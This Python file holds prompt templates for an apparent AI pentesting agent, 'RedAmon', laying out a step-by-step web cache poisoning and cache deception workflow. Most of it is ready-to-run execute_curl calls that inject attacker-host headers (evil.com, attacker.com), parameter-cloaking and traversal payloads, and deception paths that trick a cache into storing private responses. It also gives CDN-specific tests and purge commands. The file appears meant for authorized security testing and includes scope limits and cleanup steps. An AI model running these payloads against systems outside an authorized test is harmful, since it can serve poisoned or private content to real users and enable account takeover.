"""
RedAmon Web Cache Poisoning Prompts

Black-box workflows for web cache deception and poisoning attacks:
cache key manipulation, header-based cache poisoning, parameter cloaking,
CDN-specific bypasses, and cache-busting attacks.

This skill is DISTINCT from:
- xss (cache poisoning can deliver XSS but the primitive is the cache layer)
- ssrf (cache poisoning may force cache to fetch internal resources, but the
  goal is cache manipulation, not server-side request forgery)
- domain_takeover (DNS-level, not HTTP cache layer)
"""

# =============================================================================
# WEB CACHE POISONING MAIN WORKFLOW
# =============================================================================

WEB_CACHE_POISONING_TOOLS = """
## ATTACK SKILL: WEB CACHE POISONING

**CRITICAL: This attack skill has been CLASSIFIED as Web Cache Poisoning.**
**You MUST follow the cache poisoning workflow below.**

This skill covers FIVE cache attack primitives:
1. **Cache fingerprinting** — identify caching layers (CDN, reverse proxy,
   application cache), cache keys, and TTLs
2. **Cache key manipulation** — determine which headers/parameters are part of
   the cache key and which are not
3. **Header-based poisoning** — inject attacker-controlled content via headers
   that are cached but not keyed (X-Forwarded-Host, X-Forwarded-Proto, etc.)
4. **Parameter cloaking** — split cache key and backend parser via parameter
   pollution or encoding differences
5. **Cache deception** — trick the cache into storing a private response under
   a public cache key

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
Cache fingerprinting enabled:     {wcp_fingerprint_enabled}
Header poisoning enabled:         {wcp_header_poison_enabled}
Parameter cloaking enabled:       {wcp_cloak_enabled}
Cache deception enabled:          {wcp_deception_enabled}
CDN provider scope:               {wcp_cdn_providers}
Max cache poisoning attempts:     {wcp_max_attempts}
Target domain:                    {wcp_target_domain}
```

**Hard rules:**
- If `Header poisoning enabled: False`, do NOT attempt to poison caches with
  attacker-controlled content. Only fingerprint and report.
- If `Cache deception enabled: False`, do NOT attempt to cache private data.
- NEVER poison a production cache with harmful content (malicious JS, phishing
  pages, explicit material). Benign oracles only (e.g., a comment marker).
- Respect `Max cache poisoning attempts`. Default: 20. Stop after limit.
- Document every cached payload with exact URL, headers, and cache TTL for cleanup.

---

## MANDATORY WEB CACHE POISONING WORKFLOW

### Step 1: Cache fingerprinting (execute_curl + execute_httpx)

Determine if the target uses caching and what kind:

```
# Baseline request
execute_curl({{"args": "-s -I 'http://TARGET/'"}})
# Check cache headers
execute_curl({{"args": "-s -I -H 'Accept-Encoding: gzip' 'http://TARGET/'"}})
# Vary header analysis
execute_curl({{"args": "-s -I -H 'User-Agent: Mobile' 'http://TARGET/'"}})
execute_curl({{"args": "-s -I -H 'Cookie: test=1' 'http://TARGET/'"}})
```

Look for:
- `Cache-Control`, `Expires`, `Age`, `X-Cache`, `CF-Cache-Status`, `X-CDN`, `Akamai-Cache-Status`
- `Vary` header (tells you what is part of the cache key)
- `ETag` behavior (strong vs weak)
- Different responses between first and second request (cache miss vs hit)

Map the cache key components by varying one factor at a time:

```
# Test if User-Agent is in cache key
execute_curl({{"args": "-s -H 'User-Agent: A' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'User-Agent: B' 'http://TARGET/'"}})
# Test if query string is in cache key
execute_curl({{"args": "-s 'http://TARGET/?a=1'"}})
execute_curl({{"args": "-s 'http://TARGET/?a=2'"}})
```

**After Step 1, request `transition_phase` to exploitation if active poisoning is authorized.**

### Step 2: Identify unkeyed inputs

Find headers or parameters that affect the response but are NOT part of the cache key.

**Common unkeyed headers to test:**

```
execute_curl({{"args": "-s -H 'X-Forwarded-Host: evil.com' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-Forwarded-Proto: https' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-Forwarded-For: 1.2.3.4' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-HTTP-Host-Override: evil.com' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-Original-URL: /admin' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-Rewrite-URL: /admin' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-Forwarded-Path: /admin' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'X-Forwarded-Prefix: https://evil.com' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'Origin: https://evil.com' 'http://TARGET/'"}})
execute_curl({{"args": "-s -H 'Referer: https://evil.com' 'http://TARGET/'"}})
```

For each header: compare the response body/headers to the baseline. If the response
changes but a subsequent request without the header returns the POISONED response,
the header is unkeyed and the cache is poisoned.

### Step 3: Header-based poisoning (CONDITIONAL on `Header poisoning enabled`=True)

If an unkeyed header affects a reflected value (e.g., Open Graph URL, import path,
JSONP callback, A/B test assignment), poison the cache:

```
# Poison the cache with X-Forwarded-Host
execute_curl({{"args": "-s -H 'X-Forwarded-Host: attacker.com' 'http://TARGET/page.js'"}})
# Verify: request from another client without the header
execute_curl({{"args": "-s 'http://TARGET/page.js'"}})
```

If the second response contains `attacker.com`, the cache is poisoned.

**High-impact targets for header poisoning:**
- JavaScript files with dynamic imports (`import()` based on `X-Forwarded-Host`)
- JSONP endpoints (callback name from unkeyed header)
- Open Graph / social media meta tags
- OAuth redirect_uri or state parameters
- Analytics / tracking scripts
- A/B test assignment responses

### Step 4: Parameter cloaking (CONDITIONAL on `Parameter cloaking enabled`=True)

Exploit differences between cache key parsing and backend parameter parsing:

```
# Cache key uses first instance of parameter; backend uses last
execute_curl({{"args": "-s 'http://TARGET/api?callback=benign&callback=malicious'"}})
# Cache key normalizes encoding; backend does not
execute_curl({{"args": "-s 'http://TARGET/api?param=%26evil%3d1'"}})
# Cache key ignores unregistered parameters; backend processes them
execute_curl({{"args": "-s 'http://TARGET/page?__proto__[x]=1'"}})
```

For each vector: send the cloaked request, then request the canonical URL without
the cloak parameter. If the poisoned response is served, cloaking works.

### Step 5: Cache deception (CONDITIONAL on `Cache deception enabled`=True)

Trick the cache into storing a private/authenticated response under a public key:

```
# Send a request with a cache-buster extension that the cache strips but the backend ignores
execute_curl({{"args": "-s -H 'Cookie: session=VALID' 'http://TARGET/private.php%3f.css'"}})
# The cache may key on .css and serve the private response to unauthenticated users
execute_curl({{"args": "-s 'http://TARGET/private.php%3f.css'"}})
```

Common deception patterns:
- Path confusion: `/api/user.json` vs `/api/user.json/?` vs `/api/user.json/;x`
- Extension swap: `/page.php` -> `/page.php%3f.css` (cache strips query, backend sees .php)
- Method override: `GET /resource` with `X-HTTP-Method-Override: POST`
- Accept header switching: request JSON but get HTML cached

### Step 6: CDN-specific tests (CONDITIONAL on `CDN provider scope`)

| CDN | Cache key behavior | Test |
|-----|-------------------|------|
| Cloudflare | Vary on Accept-Encoding, not on cookies by default | Test `Cookie` vs `CF-Connecting-IP` |
| Fastly | Highly configurable; often keys on full URL + Host | Test `Fastly-Debug` header for cache info |
| Akamai | Keys on URL + cookies if `Akamai-Edge` config says so | Look for `Akamai-Cache-Status` |
| AWS CloudFront | Keys on query string unless configured otherwise | Test query string normalization |
| Varnish | Default: URL + Host; VCL can customize | Test `X-Forward-For` reflection |

### Step 7: Reporting requirements

The final report MUST contain:
- **Cache fingerprint** (CDN/provider, cache headers, TTL, key components)
- **Unkeyed inputs** (headers/parameters that affect response but are not in cache key)
- **Poisoned URLs** (exact URL, poison header/value, payload, cache TTL)
- **Cloaking vectors** (parameter name, cache behavior, backend behavior)
- **Deception findings** (path/encoding trick, private response cached publicly)
- **Impact** (XSS delivery, account takeover via JS poison, data exposure)
- **Cleanup** (how to purge poisoned cache entries)
- **Remediation** (key normalization, header allowlisting, cache-bypass for dynamic content)

### Proof Levels

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Cache fingerprinted (CDN identified, headers observed) | INFORMATIONAL |
| 2 | Unkeyed input identified (response changes but not keyed) | POTENTIAL |
| 3 | Cache poisoned with benign oracle (confirmed across sessions) | EXPLOITED |
| 4 | Private response cached publicly, or XSS/account takeover via poison | EXPLOITED (CRITICAL) |
"""


# =============================================================================
# WEB CACHE POISONING PAYLOAD REFERENCE
# =============================================================================

WEB_CACHE_POISONING_PAYLOAD_REFERENCE = """
## Web Cache Poisoning Reference

### Cache header glossary

| Header | Meaning | Source |
|--------|---------|--------|
| `X-Cache` | hit / miss / bypass | Varnish, some CDNs |
| `CF-Cache-Status` | HIT / MISS / BYPASS / EXPIRED | Cloudflare |
| `X-CDN-Cache` | hit / miss | Generic CDN |
| `Akamai-Cache-Status` | HIT / MISS / CONFIG_NOCACHE | Akamai |
| `Age` | Seconds since cached | HTTP standard |
| `Cache-Control` | max-age, no-cache, private, etc. | HTTP standard |
| `Vary` | Headers that form cache key | HTTP standard |

### Unkeyed header candidate list

```
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-For
X-Forwarded-Path
X-Forwarded-Prefix
X-HTTP-Host-Override
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-Forwarded-Port
X-Host
X-Scheme
X-Real-IP
X-Remote-IP
X-Remote-Addr
Origin
Referer
User-Agent
Accept
Accept-Encoding
Accept-Language
Cookie
Authorization
```

### Parameter cloaking patterns

```
# First-last parameter split
?callback=benign&callback=malicious

# Encoding differential
?param=%26evil%3d1          # cache decodes once, backend decodes twice
?param=..%252f..%252fetc%2fhosts

# Array parameter confusion
?id=1&id=2                  # cache uses first, backend uses last

# JSON parameter confusion (Content-Type: application/json)
{"id": 1, "id": 2}
```

### Cache deception path tricks

```
/page.php%3f.css            # cache strips ?, backend sees .php
/page.php/;x                # path normalization difference
/page.php/?                 # trailing query difference
/page.php/.css              # extension confusion
/api/user                   # Accept: text/html vs application/json
```

### Cache purge / cleanup

```bash
# Cloudflare purge (requires API key)
curl -X POST "https://api.cloudflare.com/client/v4/zones/<ZONE_ID>/purge_cache" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  --data '{"files":["https://TARGET/poisoned-url"]}'

# Fastly purge (requires API key)
curl -X POST "https://api.fastly.com/service/<SERVICE_ID>/purge/<URL>" \
  -H "Fastly-Key: <API_KEY>"
```

If purge is not possible, document the poisoned URL and TTL so the remediation
team knows when it expires naturally.
"""
